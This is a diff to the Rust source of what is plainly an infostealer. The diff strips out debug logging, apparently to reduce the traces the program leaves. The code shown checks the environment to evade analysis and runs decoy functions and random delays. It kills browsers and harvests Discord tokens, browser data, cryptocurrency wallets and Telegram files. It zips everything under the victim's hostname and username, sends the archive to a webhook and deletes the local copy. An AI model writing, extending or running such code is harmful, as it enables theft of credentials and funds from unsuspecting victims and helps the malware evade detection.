@@ -44,9 +44,7 @@ const SUFFIX: u32 = {
 
 #[allow(dead_code)]
 fn show_loading_dialog() {
-    dbg_log!("[LOADING] show_loading_dialog() called");
     let result = api::message_box(&s_loading_title(), &s_loading_text(), api::MB_OK | api::MB_ICONINFORMATION);
-    dbg_log!("[LOADING] message_box returned: {:?}", result);
 }
 
 #[allow(dead_code)]
@@ -111,10 +109,6 @@ fn get_webhook_url() -> String {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    dbg_log!("=== STARTUP ===");
-    dbg_log!("LOCALAPPDATA={:?}", env::var("LOCALAPPDATA"));
-    dbg_log!("APPDATA={:?}", env::var("APPDATA"));
-    dbg_log!("TEMP={:?}", env::temp_dir());
     
 
     if !core::detection::verify_environment() {
@@ -124,44 +118,32 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     thread::sleep(Duration::from_millis(100));
 
-    dbg_log!("[MAIN] Checking environment...");
     if !core::detection::verify_environment() {
-        dbg_log!("[MAIN] Environment check failed, exiting");
         
         return Ok(());
     }
-    dbg_log!("[MAIN] Environment check passed");
     
 
     let _stealth_applied = false;
 
-    dbg_log!("[MAIN] Running decoy functions...");
     let _ = core::decoy::calculate_fibonacci(100);
     let _ = core::decoy::encrypt_dummy(&[1, 2, 3]);
     let _ = core::decoy::pseudo_random();
     let _ = core::decoy::json_parse_dummy();
     core::decoy::read_system_files();
     core::decoy::system_info_gathering();
-    dbg_log!("[MAIN] Decoy functions done");
 
     let mut rng = rand::thread_rng();
     let delay = rng.gen_range(200..500);
-    dbg_log!("[MAIN] Sleeping for {}ms", delay);
     thread::sleep(Duration::from_millis(delay));
 
-    dbg_log!("[MAIN] Starting main logic...");
     browsers::common::ci::cleanup_legacy_artifacts();
-    dbg_log!("[MAIN] Cleanup done");
 
     let wbh = get_webhook_url();
-    dbg_log!("[MAIN] Webhook URL: {}", &wbh[..wbh.len().min(50)]);
     let client = reqwest::Client::new();
 
-    dbg_log!("[MAIN] Extracting Discord data...");
     let (_discord_accounts, discord_content, embeds) = crate::discord::get_discord_data(&client).await;
-    dbg_log!("[MAIN] Discord extraction complete");
 
-    dbg_log!("[MAIN] Starting browser extraction...");
     core::kill::kill_browsers();
 
     let _ = core::decoy::read_system_files();
@@ -171,9 +153,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let mut all_files = browsers::run();
     
-    dbg_log!("[MAIN] Extracting wallets...");
     let wallet_files = wallet::collect_wallets();
-    dbg_log!("[MAIN] Wallet extraction done, {} files", wallet_files.len());
     for (name, content) in wallet_files {
         all_files.push((name, String::from_utf8_lossy(&content).into_owned()));
     }
@@ -184,18 +164,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let telegram_files = telegram::get_telegram_paths();
 
-    dbg_log!("[MAIN] Browser extraction done, total files={}", all_files.len());
-
-    if let Ok(exe_path) = std::env::current_exe() {
-        if let Some(dir) = exe_path.parent() {
-            let log_path = dir.join(s_main_log_file());
-            if let Ok(log_content) = fs::read_to_string(&log_path) {
-                if !log_content.is_empty() {
-                    all_files.push(("n0.log".to_string(), log_content));
-                }
-            }
-        }
-    }
 
     let zip_name = format!("{}_{}.zip", get_hostname(), get_username());
 
@@ -204,34 +172,28 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         use std::fs::File;
         use std::io::Write;
 
-        dbg_log!("[MAIN] Creating zip with {} files", all_files.len() + telegram_files.len());
         let file = File::create(&zip_path)?;
         let mut zip = zip::ZipWriter::new(file);
         let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
 
         for (name, content) in &all_files {
-            dbg_log!("[MAIN] Adding to zip: {} ({} bytes)", name, content.len());
             zip.start_file(name, options)?;
             zip.write_all(content.as_bytes())?;
         }
 
         for (name, content) in telegram_files {
-            dbg_log!("[MAIN] Adding telegram to zip: {} ({} bytes)", name, content.len());
             zip.start_file(&name, options)?;
             zip.write_all(&content)?;
         }
 
         zip.finish()?;
-        dbg_log!("[MAIN] Zip created");
     }
 
     let zip_data = fs::read(&zip_path)?;
-    dbg_log!("[MAIN] Zip read {} bytes", zip_data.len());
 
     let _ = fs::remove_file(&zip_path);
 
     let statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;
-    for s in &statuses { dbg_log!("[MAIN] {s}"); }
 
     let _ = fs::remove_file(&zip_path);
 
